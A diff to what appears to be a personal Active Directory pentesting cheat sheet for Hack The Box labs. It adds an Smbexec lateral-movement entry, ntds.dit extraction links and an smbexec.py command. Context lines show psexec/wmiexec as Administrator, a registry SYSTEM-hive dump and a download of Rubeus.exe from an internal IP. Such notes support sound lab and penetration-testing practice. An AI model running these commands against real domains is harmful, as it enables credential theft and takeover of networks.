@@ -274,6 +274,9 @@ reg save hklm\system c:\temp\system.bak (System Hive keys)
 
 # Lateral Movement
 
+## Smbexec
+**[Smbexec](https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec)**
+
 ## WinRM 
 **[Evil-WinRM - ultimate WinRM shell for hacking/pentesting](https://github.com/Hackplayers/evil-winrm)**
 
@@ -380,6 +383,14 @@ powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.e
 
 -----------------------------------------------------------------------
 
+# Exfiltration (Domain Controller)
+
+## Extraction of ntds.dit
+**[ntdsutil](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds#a-d-maintenance-ntdsutil)**
+**[VSSAdmin](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds#volume-shadow-copy-vssadmin)**
+
+-----------------------------------------------------------------------
+
 # Active Directory Tools
 **[NetExec](https://github.com/Pennyw0rth/NetExec)**
 ```
@@ -416,6 +427,8 @@ python3 -m pipx install impacket
 smbclient.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb -debug
 wmiexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
 psexec.py -k -no-pass Administrator@dc.painters.htb -dc-ip 192.168.110.55 -debug (sometimes don't need the domain)
+smbexec.py administrator@dc.painters.htb -k -no-pass -debug
+  - [smbexec](https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec)
 ```
 
 **[Rubeus for Windows](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)**
